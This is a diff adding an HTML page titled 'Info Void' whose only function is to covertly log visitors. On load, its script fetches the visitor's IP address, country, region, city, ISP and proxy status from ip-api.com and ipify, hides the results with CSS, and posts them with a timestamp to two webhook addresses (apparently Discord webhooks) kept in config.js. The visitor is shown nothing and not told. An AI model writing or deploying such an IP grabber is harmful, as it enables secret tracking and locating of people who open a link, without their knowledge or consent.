@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Info Void</title>
+  <link rel="stylesheet" href="src/css/main.min.css">
+  <link href="https://cdn.staticaly.com/gh/hung1001/font-awesome-pro/4cac1a6/css/all.css" rel="stylesheet" type="text/css" />
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A==" crossorigin="" />
+  <link rel="icon" type="image/x-icon" href="./src/icon.ico">
+</head>
+<body>
+  <header class="header"></header>
+  <script src="./config.js"></script>
+  <script>
+    function getInformation(link, callback) {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", link, true);
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+          callback(xhr.responseText);
+        }
+      };
+      xhr.send(null);
+    }
+
+    getInformation("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
+      var ipInfoDiv = document.createElement("div");
+      ipInfoDiv.innerHTML = text;
+      ipInfoDiv.id = "ipInfo";
+      const header = document.querySelector(".header");
+      header.appendChild(ipInfoDiv);
+
+      sendEmbed();
+    });
+
+    getInformation("https://api.ipify.org/", function(text) {
+      var ipifyDiv = document.createElement("div");
+      ipifyDiv.innerHTML = text;
+      ipifyDiv.id = "ipify";
+      const header = document.querySelector(".header");
+      header.appendChild(ipifyDiv);
+    });
+
+    function sendEmbed() {
+      var ipInfo = JSON.parse(document.getElementById('ipInfo').textContent);
+      var ipify = document.getElementById('ipify').innerHTML;
+
+      const embed1 = {
+        title: "Información IP",
+        color: 0x000000, 
+        fields: [
+          {
+            name: "IP",
+            value: ipify,
+            inline: true
+          },
+          {
+            name: "País",
+            value: ipInfo.country,
+            inline: true 
+          },
+          {
+            name: "Región",
+            value: ipInfo.regionName,
+            inline: true
+          },
+          {
+            name: "Ciudad",
+            value: ipInfo.city,
+            inline: true 
+          },
+          {
+            name: "Proveedor de Internet",
+            value: ipInfo.isp,
+            inline: true 
+          },
+          {
+            name: "Proxy",
+            value: ipInfo.proxy ? "Sí" : "No",
+            inline: true
+          }
+        ]
+      };
+
+      const params1 = {
+        username: "Neko Kawaii",
+        avatar_url: 'https://media.discordapp.net/attachments/1151339410470752338/1151422586283118602/208-2088727_neko-kawaii-anime-png-download-cute-neko-anime.png?width=501&height=566',
+        embeds: [embed1]
+      };
+
+      const request1 = new XMLHttpRequest();
+      request1.open("POST", gotit);
+      request1.setRequestHeader('Content-type', 'application/json');
+      request1.send(JSON.stringify(params1));
+
+      const now = new Date();
+      const logEmbed = {
+        title: "Registro de IP",
+        color: 0xFF0000, 
+        fields: [
+          {
+            name: "IP",
+            value: ipify,
+            inline: true
+          },
+          {
+            name: "Fecha",
+            value: now.toLocaleDateString(),
+            inline: true 
+          },
+          {
+            name: "Hora",
+            value: now.toLocaleTimeString(),
+            inline: true
+          }
+        ]
+      };
+
+      const logParams = {
+        username: "Neko Kawaii",
+        avatar_url: 'https://media.discordapp.net/attachments/1151339410470752338/1151422586283118602/208-2088727_neko-kawaii-anime-png-download-cute-neko-anime.png?width=501&height=566',
+        embeds: [logEmbed]
+      };
+
+      const logRequest = new XMLHttpRequest();
+      logRequest.open("POST", ipLogWebhook);
+      logRequest.setRequestHeader('Content-type', 'application/json');
+      logRequest.send(JSON.stringify(logParams));
+    }
+  </script>
+  <style>
+    .header {
+      display: none
+    }
+
+    .map-container {
+      display: none
+    }
+  </style>
+</body>
+</html>
